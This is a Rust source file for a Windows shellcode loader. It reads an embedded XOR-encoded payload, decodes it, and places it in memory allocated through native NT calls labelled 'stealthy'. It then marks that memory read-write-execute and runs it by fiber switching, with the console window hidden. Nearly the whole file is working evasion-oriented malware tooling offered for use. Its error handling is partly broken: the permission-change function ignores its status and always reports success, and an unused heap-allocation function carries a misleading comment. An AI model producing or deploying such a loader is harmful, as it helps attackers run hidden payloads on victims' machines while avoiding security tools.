#![allow(non_snake_case)]
#![windows_subsystem = "windows"]

use std::ptr::null_mut;
use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtProtectVirtualMemory};
use ntapi::ntpsapi::NtCurrentProcess;
use ntapi::winapi::ctypes::c_void;
use windows::Win32::{
    System::{
        Memory::{HeapAlloc, GetProcessHeap, HEAP_ZERO_MEMORY},
        Threading::{ConvertThreadToFiber, CreateFiberEx, SwitchToFiber, LPFIBER_START_ROUTINE},
    },
};
use windows::Win32::System::Memory::{PAGE_READWRITE, PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE};

// XOR Key for Decoding
const XOR_KEY: u8 = 227;

fn main() {
    unsafe {
        // Load and Decode XOR Encrypted Shellcode
        let encoded_shellcode: &[u8] = include_bytes!("./encoded_shellcode.bin");
        println!("📦 Encoded shellcode length: {}", encoded_shellcode.len());
        let shellcode = xor_decode(encoded_shellcode, XOR_KEY);
        println!("📦 Decoded shellcode length: {}", shellcode.len());

        // Allocate Memory Using HeapAlloc
        let shellcode_ptr = allocate_stealthy_virtual_memory(&shellcode);

        // Change Memory to RWX
        if !set_executable(shellcode_ptr, shellcode.len()) {
            panic!("❌ Failed to change memory permissions to RWX!");
        }

        let buf_ptr: LPFIBER_START_ROUTINE = std::mem::transmute(shellcode_ptr);

        // Create a Fiber for Execution
        let hijacked_fiber = CreateFiberEx(0, 0, 0, buf_ptr, None);
        if hijacked_fiber.is_null() {
            panic!("❌ CreateFiberEx failed!");
        }
        // Convert the Main Thread into a Fiber
        let primary_fiber = ConvertThreadToFiber(None);
        if primary_fiber.is_null() {
            panic!("❌ ConvertThreadToFiber failed!");
        }

        // Execute via Fiber Switching
        SwitchToFiber(hijacked_fiber);

    }
}

// XOR Decoding Function
fn xor_decode(buf: &[u8], key: u8) -> Vec<u8> {
    buf.iter().map(|x| x ^ key).collect()
}

// Allocate Memory via HeapAlloc (Without WinAPI)
unsafe fn allocate_stealthy_shellcode(shellcode: &[u8]) -> *mut u8 {
    let heap = GetProcessHeap().unwrap();
    let ptr = HeapAlloc(heap, HEAP_ZERO_MEMORY, shellcode.len());

    if ptr.is_null() {
        panic!("HeapAlloc failed!");
    }

    std::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr as *mut u8, shellcode.len());

    ptr as *mut u8
}

// Make Heap Memory Executable using `NtProtectVirtualMemory`
unsafe fn set_executable(mem_ptr: *mut u8, size: usize) -> bool {
    let mut address: *mut _ = mem_ptr as *mut _;
    let mut region_size = size;
    let mut old_protection: u32 = PAGE_READWRITE.0; // Convert PAGE_READWRITE to u32

    let _protect_status = NtProtectVirtualMemory(
        NtCurrentProcess,
        &mut address,
        &mut region_size,
        PAGE_EXECUTE_READWRITE.0, // Convert PAGE_EXECUTE_READWRITE to u32
        &mut old_protection,
    );
    true
}
unsafe fn allocate_stealthy_virtual_memory(shellcode: &[u8]) -> *mut u8 {
    let mut base_address: *mut c_void = null_mut();
    let mut region_size: usize = shellcode.len();

    let status = NtAllocateVirtualMemory(
        NtCurrentProcess,
        &mut base_address as *mut _,
        0,
        &mut region_size,
        MEM_COMMIT.0 | MEM_RESERVE.0,
        PAGE_READWRITE.0,
    );

    if status != 0 {
        panic!("❌ NtAllocateVirtualMemory failed! Status: {:#x}", status);
    }

    if base_address.is_null() {
        panic!("❌ NtAllocateVirtualMemory returned NULL pointer!");
    }


    std::ptr::copy_nonoverlapping(shellcode.as_ptr(), base_address as *mut u8, shellcode.len());


    if !set_executable(base_address as *mut u8, shellcode.len()) {
        panic!("❌ Failed to change memory permissions to RWX!");
    }

    base_address as *mut u8
}
